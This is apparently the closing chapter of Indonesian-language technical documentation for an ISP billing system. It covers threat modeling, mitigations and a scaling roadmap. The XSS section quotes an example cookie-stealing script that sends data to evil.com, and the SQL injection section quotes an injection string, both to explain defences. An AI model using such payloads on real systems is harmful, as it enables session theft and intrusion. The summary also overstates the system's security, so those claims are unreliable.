# Bab 9: Penilaian Kerentanan, Pemodelan Ancaman, & Peta Jalan Skalabilitas (Security & Scalability Roadmap)

Untuk memenuhi standar keamanan level-perusahaan (Enterprise-grade Security Standard) dan mengamankan LadaPala-Bill (SISPEMB) sebagai sebuah produk tagihan finansial (Fintech/Billing System) yang memproses jutaan rupiah setiap harinya, dokumentasi ini tidak akan lengkap tanpa merangkum **Pemodelan Ancaman (Threat Modeling)**, **Penilaian Kerentanan (Vulnerability Assessment)**, serta rekomendasi **Skalabilitas Vertikal dan Horizontal (Scalability Roadmap)**.

Bab terakhir ini ditujukan kepada perancang arsitektur keamanan (Security Architects), *Penetration Tester*, dan *DevOps Engineers* yang bertugas membangun benteng (Fortification) pertahanan untuk aplikasi, baik yang berada di jaringan tertutup (Intranet) maupun jaringan area luas publik (Public WAN Cloud).

---

## 9.1 Pemodelan Ancaman Berbasis Vektor Serangan (Threat Modeling & Attack Vectors)

Karena aplikasi SISPEMB beroperasi dengan tiga permukaan interaksi (Attack Surface) yang berbeda—yakni *Web Admin Interface*, *Mobile App View (Webview)*, dan *Background Cron Service*—tiap lapisan rentan terhadap kelas serangan (Attack Class) yang berbeda. 

### 9.1.1 Lapisan API Endpoint (REST API Surface)
Antarmuka Pemrograman Aplikasi (API) seperti `billing_payment_save.php` dan `register_device_token.php` sangat rawan terhadap serangan injeksi atau manipulasi parameter HTTP.
*   **Ancaman (Threat)**: _Cross-Site Request Forgery (CSRF)_ dan *Double Submission* (Kondisi Transaksi Balapan / *Race Condition*).
*   **Sistem Mitigasi Eksisting (Existing Mitigation)**: Aplikasi telah menerapkan `csrf.php` yang menciptakan token _Base64_ acak menggunakan pustaka `random_bytes()` dan disandingkan dengan token di sisi klien. Selain itu, fungsi `rate_limit.php` akan memblokir (*throttle*) IP klien yang mengirim POST beruntun lebih dari batas wajar, mencegah dua kasir (atau *hacker*) menyodorkan (*submit*) pembayaran dua kali dalam durasi satu milidetik yang menyebabkan pendobelan saldo setoran (*Double Deposit Flaw*).
*   **Evaluasi Tambahan**: Pada tabel tagihan (billing_monthly_balances), LadaPala-Bill telah merajut perlindungan `FOR UPDATE` saat transaksi MySQL sedang dijalankan. Baris tersebut digembok (*row-level lock*) sehingga eksekusi serentak akan tertunda hingga baris pertama selesai dituntaskan, membunuh celah kolisi komputasional (*Computational Collision*) sampai ke akarnya.

### 9.1.2 Serangan Manipulasi Basis Data (SQL Injection)
SISPEMB secara arsitektur menggunakan objek PDO (*PHP Data Objects*) yang bertindak sebagai jembatan pelindung.
*   **Ancaman (Threat)**: Penyusupan manipulasi string *(Union-based SQL Injection)* melalui masukan pencarian (Search Input) pelanggan atau form pendaftaran.
*   **Sistem Mitigasi Eksisting**: Hampir 100% kueri relasional dalam aplikasi menggunakan Parameter Tersubstitusi (*Prepared Statements* `?` atau `:alias`). Driver PDO mengeksekusi parameter dan perintah struktural SQL secara terpisah di tahap _kernel database_. Dengan demikian, sebuah *string* usil seperti `' OR 1=1 --` hanya akan dianggap sebagai literal teks semata dan tidak pernah dieksekusi sebagai perintah logika MySQL.
*   **Area Rentan Tersisa (Residual Risk)**: *Sort order* (klausa `ORDER BY`) tidak dapat di-parameterisasi dalam PDO. Pengembang wajib mensterilkan nama kolom (menggunakan `in_array()` validasi daftarpilih/whitelist) sebelum memasukkan variabel mentah ke dalam kueri _ORDER BY_.

### 9.1.3 Serangan Sisi Klien dan Lintas Skrip (XSS - Cross Site Scripting)
Serangan ini umumnya menyasar pengguna _Dashboard_ lain.
*   **Ancaman**: *Hacker* memasukkan kode `<script>fetch('http://evil.com/?cookie='+document.cookie)</script>` pada kolom *"Nama"* atau *"Keterangan Tambahan"* saat pembuatan pelanggan.
*   **Sistem Mitigasi Eksisting**: Seperti diulas pada Bab 7, pengaturan PHP Session memberlakukan perlindungan _HttpOnly_ mutlak, sehingga peretasan *cookie* JavaScript tidak dimungkinkan. Pada lapisan *View/Presentation*, SISPEMB mewajibkan fungsi sterilisasi `htmlspecialchars($var, ENT_QUOTES, 'UTF-8')` ketika mencetak teks nama pelanggan atau area di dalam _tag_ HTML, meredam kode skrip menjadi sekadar entitas teks jinak yang tak berdaya (*Inert Text Entity*).

## 9.2 Manajemen Keamanan Integrasi Jaringan (Network Integration Security)

LadaPala-Bill berintegrasi dengan dunia luar menggunakan kunci API. Titik-titik persimpangan data ini sering menjadi celah (Vulnerability Point) paling ringkih bila diabaikan.

### 9.2.1 RouterOS API MikroTik (Port 8728/8729)
Jika ISP menaruh *Router* di berbagai wilayah publik (Outdoor Box), menyebarkan _Username_ dan _Password_ peladen API MikroTik dalam bentuk _Plaintext_ melalui WAN publik sungguh mengkhawatirkan.
*   **Sistem Mitigasi Lanjutan (Fortification)**: LadaPala-Bill mendukung sambungan enkripsi `ssl://` di _Port_ `8729`. SysAdmin **wajib** mengubah kolom pangkalan data tabel `billing_routers` untuk mengaktifkan `is_ssl = 1` (atau modifikasi di file `cron_auto_isolir.php`). Lebih aman lagi bila _Router_ MikroTik dikunci hanya menerima API dari IP statis milik *Cloud* SISPEMB di dalam konfigurasi `/ip services` MikroTik (membangun _Access Control List_ ketat).

### 9.2.2 Modul Hybrid Distributed Database (Sinkronisasi Antar-Node)
*Cron* `cron_site_push.php` bertugas mentransmisikan replika 31 tabel dari *Cloud* ke *Local*. Operasi baca tulis ini menggunakan _DSN string_ langsung melintasi TCP Port `3306` atau Porta kustom.
*   **Ancaman Pemantauan Kawat (Wire Sniffing Threat)**: MySQL yang berjalan tanpa balutan TLS sangat rawan diretas lewat pemantauan *packet sniffing* (contoh: Wireshark). Sandi pelanggan di `billing_customers` dan kata sandi _router_ di `billing_routers` dapat diendus.
*   **Rekomendasi Mutlak (Strict Recommendation)**: Admin jaringan ISP harus membungkus lalu-lintas _Sync_ tersebut di dalam **IPsec VPN Tunnel**, *WireGuard*, atau setidaknya memastikan peladen MySQL (*Local Node*) mengaktifkan opsi *Require_Secure_Transport = ON* di MariaDB, sehingga interaksi PDO murni dibungkus kriptografi TLS v1.2/v1.3 end-to-end (Ujung-ke-Ujung).

## 9.3 Peta Jalan Skalabilitas (Scalability Roadmap)

Seiring bertambahnya pelanggan dari bilangan ratusan menuju puluhan ribu (*Enterprise-Scale*), infrastruktur dan basis data LadaPala-Bill akan memerlukan penyegaran arsitektur bertahap. Berikut adalah lintasan evolusi skalabilitas.

### Fase 1: Skalabilitas Vertikal (Vertical Scaling & Index Tuning)
Fase awal pertumbuhan, seringkali sistem mengalami kelambatan di _Dashboard_.
1.  **Pemisahan Tabel (Table Partitioning)**: Tabel `billing_system_logs` dan `radacct` berpotensi menelan ruang hingga ukuran Gigabyte (GB) dalam kurun waktu satu tahun, mencekik ruang I/O diska solid (*Solid State Drive/SSD*). Admin pangkalan data perlu menetapkan **Tabel Partisi berbasis Waktu** (_Range Partitioning_ per bulan) di MariaDB. Pemartisian ini akan membuat kueri baca log yang berbasis rentang bulan berjalan puluhan kali lebih gegas ketimbang pemindaian sekuensial penuh (Full-Table Scan).
2.  **RAM Upgrades**: Skalabilitas termudah di Fase 1 adalah meningkatkan profil instansi *Virtual Private Server* (VPS) dan mendedikasikan sebagian besarnya ke _Memory Pool_ InnoDB.

### Fase 2: Skalabilitas Horizontal Lapis Web (Stateless Front-End Scale-Out)
Tatkala ratusan *Sales* me-muat-ulang (*Refresh*) dasbor dan Peta Geospasial Pelanggan secara konstan di tengah hari (Peak Hours).
1.  **Load Balancer & Stateless Session**: Arsitektur otentikasi LadaPala-Bill telah dibangun cukup *Stateless*. Untuk memperbesar kapasitas tampung sesi, pengembang harus mensubstitusi mekanisme _PHP Native File-Based Session_ (yang mengunci *State* di satu peladen spesifik) menuju perantara penyimpanan sesi internal terpusat (_Centralized In-Memory Datastore_), seperti **Redis** atau **Memcached**.
2.  Setelah ter-integrasi dengan Redis, mesin *Reverse Proxy* seperti *Nginx Load Balancer* atau *HAProxy* dapat dengan mudah menyebarkan kueri ke peladen Aplikasi A, B, atau C *(Round-Robin)* secara paralel (Horizontal Scale) dengan tingkat ketersediaan (Uptime) nyaris sempurna, tanpa memutus (logout) peramban ponsel para petugas secara acak.

### Fase 3: Skalabilitas Layanan Latar Belakang (Micro-Cron & Message Brokers)
Beban terberat di ujung skala jutaan titik (*endpoints*) berada pada tugas isolir otomatis. Iterasi *Loop* perulangan atas ribuan entitas pelanggan yang telat bayar, dipadukan panggilan lambat API MikroTik (I/O Bound task), akan menahan jalannya *Cron* `cron_auto_isolir.php` bermenit-menit.
1.  **Pemecah Tugas Asinkron (Asynchronous Worker Breakup)**: Modul *Queue* tunggal `billing_isolir_queue` saat ini sangat baik. Untuk lonjakan raksasa, migrasi ke protokol perantara pesan khusus standar industri (*Advanced Message Queuing Protocol/AMQP*) seperti **RabbitMQ** disarankan.
2.  RabbitMQ bertindak sebagai gerbang antrean tangguh. Sebelas peladen pekerja (_Worker Servers_ / Daemon berbasis Go-lang atau NodeJS yang dirancang lebih ringan dari PHP) dapat memegang dan mengonsumsi pesan antrean tersebut (Consuming the queues) dari perantara secara terisolasi. Mereka mengeksekusi komando API ke ratusan peladen MikroTik berbeda secara *Multi-threaded*, memperpendek waktu pemutusan masal yang seharusnya berjam-jam menjadi cuma hitungan detik.

## 9.4 Rangkuman Keseluruhan Evaluasi (Final Retrospective Summary)

Aplikasi SISPEMB (LadaPala-Bill) tampil sebagai studi kasus peranti lunak _Billing_ yang luar biasa kokoh, tangkas, dan brilian secara mekanis. Melalui 9 Bab ensiklopedia teknis raksasa (Massive Technical Encyclopedia) ini, kita berhasil menguliti esensinya secara telanjang.

Kecerdasan utamanya (*Brilliance of Implementation*) bukanlah berpusat pada seberapa modern *framework* atau _library_ raksasa yang diunduh via *Composer* maupun *NPM*. Melainkan seberapa mumpuni sistem memanfaatkan alat murni (_Vanilla Tools_)—**PHP Procedural Modern, Database MySQL InnoDB Transactional, PWA Javascript Native, dan Crontab**—yang dirajut apik guna menghadirkan nilai rekayasa (Engineering Value) kelas tinggi:

*   **Zero-Dependency Nightmare**: Karena aplikasi tak diikat dengan _Framework_ ketat, modifikasi, penambahan (_Patching_), atau migrasi dari PHP 7.4 menuju PHP 8.2 dapat dikerjakan secara lancar (*Seamless*) tanpa insiden konflik perpustakaan sistem (*Dependency Hell*).
*   **Otomasi Nirsentuh (Touchless Automation)**: *Cron jobs* yang secara mandiri memulihkan kegagalan isolir via fungsi `billing_isolir_queue`, dan fungsi hibrida distribusi yang dapat secara gigih menjejalkan data (Push Data) ketika peladen luring (_offline_), adalah manifestasi mutlak dari **Sistem Mandiri Toleransi-Sesar** (_Fault-Tolerant Autonomous System_).
*   **Keamanan Tanpa Kompromi (Zero-Compromise Security)**: Kehadiran kontrol sesi, parameter substitusi PDO terenkripsi (Encrypted Substitution), rotasi kunci Sinkronisasi Harian (_Rolling API Sync Key_ untuk pelaporan ke Google Sheets), hingga AES Kriptografi pada basis data, melengkapi sistem ini sebagai kastil keuangan yang sukar diruntuhkan, menjaga uang ISP dan integritas jaringan secara holistik.
